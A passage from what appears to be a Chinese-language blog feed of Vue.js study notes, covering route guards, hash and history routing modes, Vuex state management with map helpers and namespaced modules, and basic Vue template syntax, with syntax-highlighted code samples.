comment">//全局后置守卫：初始化时执行、每次路由切换后执行</span>router<span class="token punctuation">.</span><span class="token function">afterEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span><span class="token keyword">from</span></span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'afterEach'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> document<span class="token punctuation">.</span>title <span class="token operator">=</span> to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>title <span class="token comment">//修改网页的title</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'vue_test'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="4-独享守卫"><a href="#4-独享守卫" class="headerlink" title="4. 独享守卫"></a>4. 独享守卫</h3> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token function">beforeEnter</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span><span class="token keyword">from</span><span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeEnter'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>isAuth<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//判断当前路由是否需要进行权限控制</span><span class="token keyword">if</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'school'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'atguigu'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'暂无权限查看'</span><span class="token punctuation">)</span><span class="token comment">// next(&#123;name:'guanyu'&#125;)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="5-组件内守卫"><a href="#5-组件内守卫" class="headerlink" title="5. 组件内守卫"></a>5. 组件内守卫</h3> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token comment">//进入守卫：通过路由规则，进入该路由组件时被调用</span><span class="token function">beforeRouteEnter</span> <span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> <span class="token keyword">from</span><span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">//离开守卫：通过路由规则，离开该路由组件时被调用</span><span class="token function">beforeRouteLeave</span> <span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> <span class="token keyword">from</span><span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="十四、路由的两种工作模式"><a href="#十四、路由的两种工作模式" class="headerlink" title="十四、路由的两种工作模式"></a>十四、路由的两种工作模式</h2><h3 id="1-什么是hash值"><a href="#1-什么是hash值" class="headerlink" title="1. 什么是hash值?"></a>1. 什么是hash值?</h3><p> 对于一个url来说——#及其后面的内容就是hash值</p><h3 id="2-hash值是否会包含在请求中"><a href="#2-hash值是否会包含在请求中" class="headerlink" title="2. hash值是否会包含在请求中"></a>2. hash值是否会包含在请求中</h3><p> hash值不会包含在HTTP请求中,即: hash值不会带给服务器</p><h3 id="3-hash模式"><a href="#3-hash模式" class="headerlink" title="3. hash模式"></a>3. hash模式</h3><p> ①地址中永远带着#号,不美观<br> ②若以后将地址通过第三方手机app分享,若app校验严格,则地址会被标记为不合法<br> ③兼容性较好</p><h3 id="4-history模式"><a href="#4-history模式" class="headerlink" title="4.history模式"></a>4.history模式</h3><p> ①地址干净、美观<br> ②兼容性和hash模式相比略差<br> ③应用部署上线时需要后端人员支持,解决刷新页面服务端404的问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> -Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuex</title>
      <link href="/2021/12/16/vuex/"/>
      <url>/2021/12/16/vuex/</url>
      
        <content type="html"><![CDATA[<h1 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h1><a id="more"></a><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h2><p> 在Vue中实现集中式状态(数据)管理的一个Vue插件,对Vue应用中多个组件的共享状态进行集中式的管理(读/写),也是一种组件间通信的方式,且适用于任意组件间通信</p><p> <img src="/vue/vuex.png"></p><h2 id="2-何时使用"><a href="#2-何时使用" class="headerlink" title="2. 何时使用"></a>2. 何时使用</h2><p> 多个组件需要共享数据时</p><h2 id="3-搭建Vuex环境"><a href="#3-搭建Vuex环境" class="headerlink" title="3. 搭建Vuex环境"></a>3. 搭建Vuex环境</h2><h3 id="3-1-创建文件"><a href="#3-1-创建文件" class="headerlink" title="3.1 创建文件"></a>3.1 创建文件</h3><p> <code>src/store/index.js</code></p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//引入Vue核心库</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token comment">//引入Vuex</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span><span class="token comment">//应用Vuex插件</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token comment">//准备actions对象——响应组件中用户的动作</span><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//准备mutations对象——修改state中的数据</span><span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//准备state对象——保存具体的数据</span><span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  actions<span class="token punctuation">,</span>  mutations<span class="token punctuation">,</span>  state<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="3-2-配置"><a href="#3-2-配置" class="headerlink" title="3.2 配置"></a>3.2 配置</h3><p> 在<code>main.js</code>中创建vm时传入<code>store</code>配置项</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">...</span><span class="token operator">...</span><span class="token comment">//引入store</span><span class="token keyword">import</span> store <span class="token keyword">from</span> <span class="token string">'./store'</span><span class="token operator">...</span><span class="token operator">...</span><span class="token comment">//创建vm</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  el<span class="token operator">:</span><span class="token string">'#app'</span><span class="token punctuation">,</span>  <span class="token function-variable function">render</span><span class="token operator">:</span> <span class="token parameter">h</span> <span class="token operator">=></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">,</span>  store<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h2 id="4-基本使用"><a href="#4-基本使用" class="headerlink" title="4. 基本使用"></a>4. 基本使用</h2><p> ①初始化数据、配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//引入Vue核心库</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token comment">//引入Vuex</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span><span class="token comment">//引用Vuex</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//响应组件中加的动作</span>    <span class="token function">jia</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// console.log('actions中的jia被调用了',miniStore,value)</span>    context<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'JIA'</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//执行加</span>  <span class="token constant">JIA</span><span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// console.log('mutations中的JIA被调用了',state,value)</span>    state<span class="token punctuation">.</span>sum <span class="token operator">+=</span> value  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//初始化数据</span><span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  sum<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  actions<span class="token punctuation">,</span>  mutations<span class="token punctuation">,</span>  state<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p> ②组件中读取vuex中的数据<br>  <code>$store.state.sum</code></p><p> ③组件中修改vuex的数据<br>  <code>$store.dispatch(&#39;action中的方法名&#39;,数据)</code> 或 <code>$store.commit(&#39;mutations中的方法名&#39;,数据)</code></p><p> 备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写<code>dispatch</code>，直接编写<code>commit</code></p><h2 id="5-getters的使用"><a href="#5-getters的使用" class="headerlink" title="5. getters的使用"></a>5. getters的使用</h2><h3 id="①-概念"><a href="#①-概念" class="headerlink" title="①.概念"></a>①.概念</h3><p> 当state中的数据需要经过加工后再使用时,可以使用getters加工</p><h3 id="②-配置"><a href="#②-配置" class="headerlink" title="②.配置"></a>②.配置</h3><p> 在<code>store.js</code>中追加<code>getters</code>配置<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">const</span> getters <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token function">bigSum</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> state<span class="token punctuation">.</span>sum <span class="token operator">*</span> <span class="token number">10</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token operator">...</span><span class="token operator">...</span>  getters<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre></p><h3 id="③-组件中读取数据"><a href="#③-组件中读取数据" class="headerlink" title="③.组件中读取数据"></a>③.组件中读取数据</h3><p>  <code>$store.getters.bigSum</code></p><h2 id="6-四个map方法的使用"><a href="#6-四个map方法的使用" class="headerlink" title="6. 四个map方法的使用"></a>6. 四个map方法的使用</h2><h3 id="6-1-mapState"><a href="#6-1-mapState" class="headerlink" title="6.1 mapState"></a>6.1 mapState</h3><p> 用于帮助我们映射state中的数据为计算属性<br> <pre class="language-js" data-language="js"><code class="language-js">computed<span class="token operator">:</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//借助mapState生成计算属性：sum、school、subject（对象写法）</span>    <span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>sum<span class="token operator">:</span><span class="token string">'sum'</span><span class="token punctuation">,</span>school<span class="token operator">:</span><span class="token string">'school'</span><span class="token punctuation">,</span>subject<span class="token operator">:</span><span class="token string">'subject'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>           <span class="token comment">//借助mapState生成计算属性：sum、school、subject（数组写法）</span>   <span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token string">'subject'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span></code></pre></p><h3 id="6-2-mapGetters"><a href="#6-2-mapGetters" class="headerlink" title="6.2 mapGetters"></a>6.2 mapGetters</h3><p> 用于帮助我们映射getters中的数据为计算属性<br> <pre class="language-js" data-language="js"><code class="language-js">computed<span class="token operator">:</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//借助mapGetters生成计算属性：bigSum（对象写法）</span>   <span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>bigSum<span class="token operator">:</span><span class="token string">'bigSum'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token comment">//借助mapGetters生成计算属性：bigSum（数组写法）</span>   <span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'bigSum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span></code></pre></p><h3 id="6-3-mapActions"><a href="#6-3-mapActions" class="headerlink" title="6.3 mapActions"></a>6.3 mapActions</h3><p> 用于帮助我们生成与actions对话的方法,即: 包含<code>$store.commit(xxx)</code>的函数</p> <pre class="language-js" data-language="js"><code class="language-js">methods<span class="token operator">:</span><span class="token punctuation">&#123;</span>  <span class="token comment">//靠mapActions生成：incrementOdd、incrementWait（对象形式）</span>  <span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>incrementOdd<span class="token operator">:</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span>incrementWait<span class="token operator">:</span><span class="token string">'jiaWait'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">//靠mapActions生成：incrementOdd、incrementWait（数组形式）</span>  <span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token string">'jiaWait'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><h3 id="6-4-mapMutations"><a href="#6-4-mapMutations" class="headerlink" title="6.4 mapMutations"></a>6.4 mapMutations</h3><p> 用于帮助我们生产与<code>mutations</code>对话的方法,即：包含<code>$store.commit(xxx)</code>的函数</p> <pre class="language-js" data-language="js"><code class="language-js">methods<span class="token operator">:</span><span class="token punctuation">&#123;</span>   <span class="token comment">//靠mapActions生成：increment、decrement（对象形式）</span>   <span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>increment<span class="token operator">:</span><span class="token string">'JIA'</span><span class="token punctuation">,</span>decrement<span class="token operator">:</span><span class="token string">'JIAN'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token comment">//靠mapMutations生成：JIA、JIAN（对象形式）</span>   <span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token string">'JIAN'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span></code></pre><p> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象</p><h2 id="7-模块化-命名空间"><a href="#7-模块化-命名空间" class="headerlink" title="7. 模块化+命名空间"></a>7. 模块化+命名空间</h2><h3 id="7-1-目的"><a href="#7-1-目的" class="headerlink" title="7.1 目的"></a>7.1 目的</h3><p> 让代码更好维护,让多种数据分类更加明确</p><h3 id="7-2-配置"><a href="#7-2-配置" class="headerlink" title="7.2 配置"></a>7.2 配置</h3><p> 修改<code>store.js</code><br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> countAbout <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  namespaced<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//开启命名空间</span>  state<span class="token operator">:</span><span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  mutations<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  actions<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  getters<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token function">bigSum</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> state<span class="token punctuation">.</span>sum <span class="token operator">*</span> <span class="token number">10</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> personAbout <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  namespaced<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//开启命名空间</span>  state<span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  mutations<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  actions<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">const</span> store <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  modules<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    countAbout<span class="token punctuation">,</span>    personAbout  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre></p><h3 id="7-3-开启命名空间后读取数据"><a href="#7-3-开启命名空间后读取数据" class="headerlink" title="7.3 开启命名空间后读取数据"></a>7.3 开启命名空间后读取数据</h3><h4 id="①-组件中读取state数据"><a href="#①-组件中读取state数据" class="headerlink" title="① 组件中读取state数据"></a>① 组件中读取state数据</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//方式一：自己直接读取</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>state<span class="token punctuation">.</span>personAbout<span class="token punctuation">.</span>list<span class="token comment">//方式二：借助mapState读取：</span><span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token string">'subject'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span></code></pre><h4 id="②-组件中读取getters数据"><a href="#②-组件中读取getters数据" class="headerlink" title="② 组件中读取getters数据"></a>② 组件中读取getters数据</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//方式一：自己直接读取</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>getters<span class="token punctuation">[</span><span class="token string">'personAbout/firstPersonName'</span><span class="token punctuation">]</span><span class="token comment">//方式二：借助mapGetters读取：</span><span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'bigSum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h4 id="③-组件中调用dispatch"><a href="#③-组件中调用dispatch" class="headerlink" title="③ 组件中调用dispatch"></a>③ 组件中调用dispatch</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//方式一：自己直接dispatch</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'personAbout/addPersonWang'</span><span class="token punctuation">,</span>person<span class="token punctuation">)</span><span class="token comment">//方式二：借助mapActions：</span><span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>incrementOdd<span class="token operator">:</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span>incrementWait<span class="token operator">:</span><span class="token string">'jiaWait'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h4 id="④-组件中调用commit"><a href="#④-组件中调用commit" class="headerlink" title="④ 组件中调用commit"></a>④ 组件中调用commit</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//方式一：自己直接commit</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'personAbout/ADD_PERSON'</span><span class="token punctuation">,</span>person<span class="token punctuation">)</span><span class="token comment">//方式二：借助mapMutations：</span><span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>increment<span class="token operator">:</span><span class="token string">'JIA'</span><span class="token punctuation">,</span>decrement<span class="token operator">:</span><span class="token string">'JIAN'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> -Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四十篇博客</title>
      <link href="/2021/12/06/di-si-shi-pian-bo-ke/"/>
      <url>/2021/12/06/di-si-shi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue知识点"><a href="#Vue知识点" class="headerlink" title="Vue知识点"></a>Vue知识点</h1><a id="more"></a><h2 id="一、初识Vue"><a href="#一、初识Vue" class="headerlink" title="一、初识Vue"></a>一、初识Vue</h2><p> ①想让Vue工作,就必须创建一个Vue实例,且要传入一个配置对象</p><p> ②root容器里的代码依然符合html规范,只不过混入了一些特殊的Vue语法</p><p> ③root容器里的代码被称为【Vue模板】</p><p> ④Vue实例和容器是一一对应的</p><p> ⑤真实开发中只有一个Vue实例,并且会配合着组件一起使用</p><p> ⑥中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；</p><p> ⑦一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新</p><p> 注意区分: js表达式和js代码(语句)<br>   1.js表达式:一个表达式会产生一个值,可以放在任何一个需要值的地方<br>    ① a<br>    ② demo(1)<br>    ③ x=== y ? 1 : 2<br>   2.js代码(语句)<br>    ① if(){}<br>    ② for(){}</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 引入Vue <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> src<span class="token operator">=</span><span class="token string">"../js/vue.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 准备好一个容器 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"demo"</span><span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>Hello，<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>，<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>address<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> <span class="token operator">></span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token comment">//阻止 vue 在启动时生成生产提示。</span><span class="token comment">//创建Vue实例</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#demo'</span><span class="token punctuation">,</span> <span class="token comment">//el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token comment">//data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。</span>name<span class="token operator">:</span><span class="token string">'atguigu'</span><span class="token punctuation">,</span>address<span class="token operator">:</span><span class="token string">'北京'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="二、模板语法"><a href="#二、模板语法" class="headerlink" title="二、模板语法"></a>二、模板语法</h2><h3 id="1-Vue模板语法"><a href="#1-Vue模板语法" class="headerlink" title="1.Vue模板语法"></a>1.Vue模板语法</h3><p> Vue模板语法有两大类: ①插值语法 ②指令语法</p><h3 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a>2.分类</h3><h4 id="2-1-插值语法"><a href="#2-1-插值语法" class="headerlink" title="2.1 插值语法"></a>2.1 插值语法</h4><p> ①功能<br>  用于解析标签体内容</p><p> ②写法<br>  ,xxx是js表达式,且可以直接读取到data中的所有属性</p><h4 id="2-2-指令语法"><a href="#2-2-指令语法" class="headerlink" title="2.2 指令语法"></a>2.2 指令语法</h4><p> ①功能<br>  用于解析标签(包括:标签属性、标签体内容、绑定事件…)</p><p> ②例子<br>  v-bind:href=”xxx” 或 简写为 :href=”xxx”,xxx同样要写成js表达式,且可以直接读取到data中的所有属性</p><p>  注意:Vue中有很多的指令,形式都是: v-???</p>  <pre class="language-js" data-language="js"><code class="language-js">  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 准备好一个容器<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>插值语法<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span>h3<span class="token operator">></span>你好，<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span>hr<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>指令语法<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span>a v<span class="token operator">-</span>bind<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"school.url.toUpperCase()"</span> x<span class="token operator">=</span><span class="token string">"hello"</span><span class="token operator">></span>点我去<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>school<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>学习<span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"school.url"</span> x<span class="token operator">=</span><span class="token string">"hello"</span><span class="token operator">></span>点我去<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>school<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>学习<span class="token number">2</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token comment">//阻止 